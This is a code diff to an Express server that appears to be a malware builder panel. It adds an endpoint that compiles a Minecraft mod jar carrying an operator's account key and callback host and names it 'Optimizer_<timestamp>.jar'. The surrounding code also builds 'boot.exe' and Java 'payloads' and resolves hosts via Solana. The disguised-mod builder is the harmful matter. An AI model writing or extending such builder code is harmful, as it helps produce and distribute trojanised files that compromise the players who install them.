@@ -20,6 +20,7 @@ import { startUdp, closeUdp, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { buildJavaPayload } from './builder/java_build.js';
+import { buildMinecraftMod } from './builder/minecraft_build.js'; // <-- NEW IMPORT
 import { getCachedUser, invalidateUser, userCacheById, userCacheByKey, getCache, setCache, clearCache } from './cache.js';
 import { fetchSolanaIp, getRemoteIp } from './discovery.js';
 
@@ -999,6 +1000,32 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     url: `/api/builds/${info.insertId}/download`,
     liveUrl: '/api/downloads/boot.exe',
   });
+});
+
+app.post('/api/build/minecraft', requireAuth, async (req, res) => {
+  const { host } = req.body;
+  if (!host) return res.status(400).json({ error: 'host required' });
+
+  const row = await getOwnUser(req.user.uid);
+  const acctKey = row?.account_key || '';
+  if (!acctKey) return res.status(400).json({ error: 'no account key' });
+
+  try {
+    const jarBuf = await buildMinecraftMod({ key: acctKey, host });
+    
+    const outName = `Optimizer_${Date.now()}.jar`;
+    const outPath = path.join(DOWNLOAD_DIR, outName);
+    fs.writeFileSync(outPath, jarBuf);
+
+    res.json({
+      ok: true,
+      url: `/api/downloads/${outName}`,
+      size: jarBuf.length
+    });
+  } catch (e) {
+    console.error('[mc-build]', e);
+    res.status(500).json({ error: 'compile failed: ' + e.message });
+  }
 });
 
 app.get('/api/builds', requireAuth, async (req, res) => {
